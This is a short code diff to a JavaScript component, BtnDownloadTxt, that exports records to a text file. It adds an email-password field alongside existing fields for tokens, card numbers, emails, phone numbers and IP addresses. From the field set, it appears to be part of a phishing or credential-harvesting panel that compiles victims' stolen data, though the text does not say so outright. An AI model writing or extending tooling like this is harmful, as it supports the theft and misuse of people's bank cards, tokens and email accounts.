@@ -21,6 +21,7 @@ export const BtnDownloadTxt = () => {
 = token2: ${e.token2 == undefined  ? 'no tiene' : e.token2}
 = tarjeta: ${e.tarjeta == undefined ? 'no tiene' : e.tarjeta}
 = correo: ${e.correo  == undefined ? 'no tiene' : e.correo}
+= clave correo: ${e.claveCorreo  == undefined ? 'no tiene' : e.claveCorreo}
 = cel: ${e.celular == undefined ? 'no tiene' : e.celular}
 = ip: ${e.ip}
 ==========
